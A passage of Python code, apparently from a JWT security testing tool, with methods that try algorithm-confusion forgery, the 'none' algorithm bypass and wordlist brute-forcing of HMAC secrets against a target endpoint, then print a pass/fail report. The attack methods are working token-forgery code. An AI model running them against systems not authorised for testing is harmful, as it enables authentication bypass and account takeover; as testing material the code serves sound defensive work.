            new_token = jwt.encode(payload, public_key, algorithm="HS256")

            # Test the token
            response = self._test_token(new_token)
            if response.status_code == 200:
                self.results.append({
                    "test": "Algorithm Confusion",
                    "status": "VULNERABLE",
                    "details": "Server accepted HS256 token with RSA public key"
                })
            else:
                self.results.append({
                    "test": "Algorithm Confusion", 
                    "status": "SECURE",
                    "details": "Server rejected algorithm confusion attempt"
                })

        except Exception as e:
            self.results.append({
                "test": "Algorithm Confusion",
                "status": "ERROR", 
                "details": str(e)
            })

    def test_none_algorithm(self):
        """Test none algorithm attack"""
        try:
            # Decode token parts
            parts = self.token.split('.')
            header = json.loads(base64.b64decode(parts[0] + '=='))
            payload = json.loads(base64.b64decode(parts[1] + '=='))

            # Create new header with none algorithm
            header['alg'] = 'none'

            # Encode new token
            new_header = base64.b64encode(json.dumps(header).encode()).decode().rstrip('=')
            new_payload = base64.b64encode(json.dumps(payload).encode()).decode().rstrip('=')
            new_token = f"{new_header}.{new_payload}."

            # Test the token
            response = self._test_token(new_token)
            if response.status_code == 200:
                self.results.append({
                    "test": "None Algorithm",
                    "status": "VULNERABLE", 
                    "details": "Server accepted token with none algorithm"
                })
            else:
                self.results.append({
                    "test": "None Algorithm",
                    "status": "SECURE",
                    "details": "Server rejected none algorithm token"
                })

        except Exception as e:
            self.results.append({
                "test": "None Algorithm",
                "status": "ERROR",
                "details": str(e)
            })

    def test_weak_secrets(self, wordlist_path):
        """Test weak HMAC secrets"""
        try:
            with open(wordlist_path, 'r') as f:
                secrets = [line.strip() for line in f]

            for secret in secrets:
                try:
                    jwt.decode(self.token, secret, algorithms=["HS256"])
                    self.results.append({
                        "test": "Weak Secret",
                        "status": "VULNERABLE",
                        "details": f"Found weak secret: {secret}"
                    })
                    return
                except jwt.InvalidSignatureError:
                    continue

            self.results.append({
                "test": "Weak Secret",
                "status": "SECURE", 
                "details": "No weak secrets found in wordlist"
            })

        except Exception as e:
            self.results.append({
                "test": "Weak Secret",
                "status": "ERROR",
                "details": str(e)
            })

    def _test_token(self, token):
        """Test token against target endpoint"""
        headers = {"Authorization": f"Bearer {token}"}
        return self.session.get(f"{self.target_url}/api/protected", headers=headers)

    def generate_report(self):
        """Generate security testing report"""
        print("\n" + "="*50)
        print("JWT SECURITY TESTING REPORT")
        print("="*50)

        for result in self.results:
            status_icon = "✅" if result["status"] == "SECURE" else "❌" if result["status"] == "VULNERABLE" else "⚠️"
            print(f"\n{status_icon} {result['test']}: {result['status']}")
            print(f"   Details: {result['details']}")

# Usage example
